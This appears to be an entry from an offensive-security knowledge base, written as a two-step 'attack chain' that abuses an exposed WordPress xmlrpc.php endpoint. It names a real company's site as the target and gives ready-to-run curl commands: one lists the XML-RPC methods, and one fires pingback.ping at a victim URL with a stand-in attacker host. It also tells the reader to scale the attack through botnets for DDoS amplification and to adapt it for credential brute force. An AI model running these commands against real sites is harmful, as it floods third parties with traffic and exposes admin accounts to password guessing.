---
tags:
  - xmlrpc
  - wordpress
  - ddos
  - brute-force
  - misconfiguration
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Verify-XML-RPC-Endpoint-Accessibility]]'
  - '[[procedures/Demonstrate-DDoS-via-Pingback-ping]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:26:56.558Z'
description: >-
  Attack chain exploiting enabled xmlrpc.php on WordPress sites for
  reconnaissance, DDoS amplification via pingback.ping, and potential brute
  force credential attacks.
skill_level: intermediate
impact_level: high
id: 13c10608-9e1e-491c-af7d-f78a5c5e738f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
  - '[[Brute Force]]'
---
# WordPress XML-RPC Misconfiguration Enabling DDoS Amplification and Brute Force Attacks

Multi-stage attack chain demonstrating exploitation of enabled xmlrpc.php on a WordPress site, such as NordVPN's, for verifying the endpoint, amplifying DDoS attacks via pingback mechanisms, and enabling brute force attempts on admin credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Verify XML-RPC Endpoint] --> B[Exploit for DDoS Amplification]
    B --> C[Potential Brute Force or Botnet Integration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform with WordPress
- xmlrpc.php endpoint accessible (often protected by Cloudflare)
- No authentication required for initial verification

### Initial Access Requirements

- Public network access to the target domain (e.g., nordvpn.com)
- No credentials needed for reconnaissance or DDoS demo
- For brute force, admin login endpoints must be guessable

## Detailed Attack Procedures

### Step 1: Verify XML-RPC Endpoint Accessibility
procedure: [[procedures/Verify-XML-RPC-Endpoint-Accessibility]]

**Objective**: Confirm if xmlrpc.php is enabled and list available XML-RPC methods to assess exploitability.

**Instructions**: Use [[commands/list-xmlrpc-methods]] to send a POST request listing methods:

```bash
curl -X POST https://nordvpn.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

**Expected Output**: XML response with a list of methods including pingback.ping, wp.newPost, etc., confirming the endpoint is active.

**Success Indicators**:
- Response contains <methodName> tags with exploitable methods like pingback.ping
- HTTP 200 status without errors

### Step 2: Demonstrate DDoS Potential via Pingback.ping
procedure: [[procedures/Demonstrate-DDoS-via-Pingback-ping]]

**Objective**: Trigger outbound HTTP requests from the server to a target, demonstrating amplification for DDoS or botnet abuse; also highlights brute force potential via repeated method calls.

**Instructions**: Execute [[commands/trigger-pingback-ping]] to simulate a pingback, forcing the server to fetch a victim URL:

```bash
curl -X POST https://nordvpn.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker-server.com/payload</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'
```

Scale this with scripts or botnets for amplification. For brute force, adapt to wp.getUsersBlogs or similar for credential testing.

**Expected Output**: Server initiates an HTTP GET to the target URL, verifiable via logs on victim or attacker server; response may indicate success or fault.

**Success Indicators**:
- Outbound request observed from target server to victim
- No immediate blocking (e.g., by Cloudflare)
- Potential for high amplification if method is rate-unlimited

## Attack Chain Summary

### Key Achievements

1. Confirmed xmlrpc.php exposure on public WordPress site
2. Demonstrated DDoS amplification using pingback.ping to force server-side requests
3. Highlighted risks of brute force attacks on admin credentials via XML-RPC methods

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service
- [[Brute Force]] Brute Force

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---
*Last updated: 2024-10-01T00:00:00Z*
